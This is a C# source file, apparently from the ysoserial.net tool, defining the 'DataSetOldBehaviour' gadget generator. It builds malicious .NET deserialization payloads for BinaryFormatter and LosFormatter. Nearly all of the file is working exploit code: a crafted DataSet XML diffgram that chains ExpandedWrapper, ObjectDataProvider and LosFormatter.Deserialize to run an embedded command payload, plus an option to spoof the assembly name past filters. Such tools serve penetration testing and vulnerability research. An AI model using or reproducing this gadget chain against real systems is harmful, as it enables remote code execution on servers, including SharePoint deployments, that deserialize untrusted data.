using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ysoserial.Generators;
using ysoserial.Helpers;
using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysoserial.Generators
{
    internal class DataSetOldBehaviourGenerator : GenericGenerator
    {
        public override string AdditionalInfo()
        {
            /*
                The DataSetOldBehaviour and DataSetOldBehaviourFromFile gadgets are based on three ideas:
                1- Steven Seeley's research documented at https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
                
                2- Concept of converting BinaryFromatter to JSON by Soroush Dalili for further manipulation and pruning
                
                3- Markus Wulftange's idea of loading assembly byte code to bypass restrictions we currently have for ActivitySurrogateSelector
                
                This gadget targets and old behaviour of DataSet which uses XML format (https://github.com/microsoft/referencesource/blob/dae14279dd0672adead5de00ac8f117dcf74c184/System.Data/System/Data/DataSet.cs#L323) which is different than what was found in the DataSet gadget by James Forshaw
             */
            var info = @"This gadget targets and old behaviour of DataSet which uses XML format";

            return info;
        }

        public override string Name()
        {
            return "DataSetOldBehaviour";
        }

        public override string Finders()
        {
            return "Steven Seeley";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "LosFormatter" }; // SoapFormatter for the curious?
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.LosFormatter;
        }

        string spoofedAssembly = "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"spoofedAssembly=", "The assembly name you want to use in the generated serialized object (example: 'mscorlib')", v => spoofedAssembly = v }
            };

            return options;
        }

        string xmlSchema = "<?xml version=\"1.0\" encoding=\"utf-16\"?>\r\n<xs:schema id=\"ds\" xmlns=\"\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\">\r\n  <xs:element name=\"ds\" msdata:IsDataSet=\"true\" msdata:UseCurrentLocale=\"true\">\r\n    <xs:complexType>\r\n      <xs:choice minOccurs=\"0\" maxOccurs=\"unbounded\">\r\n        <xs:element name=\"tbl\">\r\n          <xs:complexType>\r\n            <xs:sequence>\r\n <xs:element name=\"objwrapper\" msdata:DataType=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" type=\"xs:anyType\" msdata:targetNamespace=\"\" minOccurs=\"0\" />\r\n            </xs:sequence>\r\n          </xs:complexType>\r\n        </xs:element>\r\n      </xs:choice>\r\n    </xs:complexType>\r\n  </xs:element>\r\n</xs:schema>";

        string xmlLosFormatterDeserializeCaller = "<diffgr:diffgram xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\" xmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\"><ds><tbl diffgr:id=\"tbl1\" msdata:rowOrder=\"0\"><objwrapper xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><ExpandedElement /><ProjectedProperty0><ObjectInstance xsi:type=\"LosFormatter\" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">%LosFromatterPayload%</anyType></MethodParameters></ProjectedProperty0></objwrapper></tbl></ds></diffgr:diffgram>";

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] losFormatterPayload;
            if (BridgedPayload != null)
            {
                losFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                losFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("LosFormatter", inputArgs);
            }

            if (inputArgs.Minify)
            {
                if (inputArgs.UseSimpleType)
                {
                    xmlSchema = XmlHelper.Minify(xmlSchema, new string[] { }, new string[] { });
                    xmlLosFormatterDeserializeCaller = XmlHelper.Minify(xmlLosFormatterDeserializeCaller, new string[] { }, new string[] { });
                }
                else
                {
                    xmlSchema = XmlHelper.Minify(xmlSchema, new string[] { }, new string[] { });
                    xmlLosFormatterDeserializeCaller = XmlHelper.Minify(xmlLosFormatterDeserializeCaller, new string[] { }, new string[] { });
                }
            }

            xmlSchema = CommandArgSplitter.JsonStringEscape(xmlSchema);
            xmlLosFormatterDeserializeCaller = CommandArgSplitter.JsonStringEscape(xmlLosFormatterDeserializeCaller);

            var losFormatterPayloadString = Encoding.UTF8.GetString(losFormatterPayload);

            xmlLosFormatterDeserializeCaller = xmlLosFormatterDeserializeCaller.Replace("%LosFromatterPayload%", losFormatterPayloadString);

            

            var bf_json = @"[{""Id"": 1,
    ""Data"": {
      ""$type"": ""SerializationHeaderRecord"",
      ""binaryFormatterMajorVersion"": 1,
      ""binaryFormatterMinorVersion"": 0,
      ""binaryHeaderEnum"": 0,
      ""topId"": 1,
      ""headerId"": -1,
      ""majorVersion"": 1,
      ""minorVersion"": 0
}},{""Id"": 2,
    ""TypeName"": ""Assembly"",
    ""Data"": {
      ""$type"": ""BinaryAssembly"",
      ""assemId"": 2,
      ""assemblyString"": ""%SPOOFED%""
}},{""Id"": 3,
    ""TypeName"": ""ObjectWithMapTypedAssemId"",
    ""Data"": {
      ""$type"": ""BinaryObjectWithMapTyped"",
      ""binaryHeaderEnum"": 5,
      ""objectId"": 1,
      ""name"": ""System.Data.DataSet,System.Data"",
      ""numMembers"": 2,
      ""memberNames"":[""XmlSchema"",""XmlDiffGram""],
      ""binaryTypeEnumA"":[1,1],
      ""typeInformationA"":[null,null],
      ""typeInformationB"":[null,null],
      ""memberAssemIds"":[0,0],
      ""assemId"": 2
}},{""Id"": 5,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 4,
      ""value"": """ + xmlSchema + @"""
}},{""Id"": 6,
    ""TypeName"": ""ObjectString"",
    ""Data"": {
      ""$type"": ""BinaryObjectString"",
      ""objectId"": 5,
      ""value"": """ + xmlLosFormatterDeserializeCaller+ @"""
}},{""Id"": 12,
    ""TypeName"": ""MessageEnd"",
    ""Data"": {
      ""$type"": ""MessageEnd""
}}]";

            bf_json = bf_json.Replace("%SPOOFED%", spoofedAssembly);

            MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(bf_json);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
            {
                //BinaryFormatter
                if (inputArgs.Test)
                {
                    try
                    {
                        ms_bf.Position = 0;
                        SerializersHelper.BinaryFormatter_deserialize(ms_bf);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return ms_bf.ToArray();
            }
            else if(formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                // LosFormatter
                MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);

                if (inputArgs.Test)
                {
                    try
                    {
                        ms_bf.Position = 0;
                        SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return ms_lf.ToArray();
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
